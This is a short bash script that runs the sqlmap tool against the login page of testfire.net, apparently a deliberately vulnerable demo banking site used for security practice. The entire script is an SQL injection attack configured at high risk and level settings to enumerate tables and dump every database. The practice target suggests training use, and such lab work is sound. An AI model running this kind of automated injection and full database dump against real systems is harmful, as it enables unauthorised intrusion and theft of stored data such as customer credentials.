#!/bin/bash

URI="http://www.testfire.net/bank/login.aspx?uid=potato&passw=secretpotato"
DMBS="Microsoft Access"

sqlmap\
	-u $URI\
	--tables\
	--all\
	--dump-all\
	--output-dir="./sqlmap/"\
	--level=2\
	--risk=3
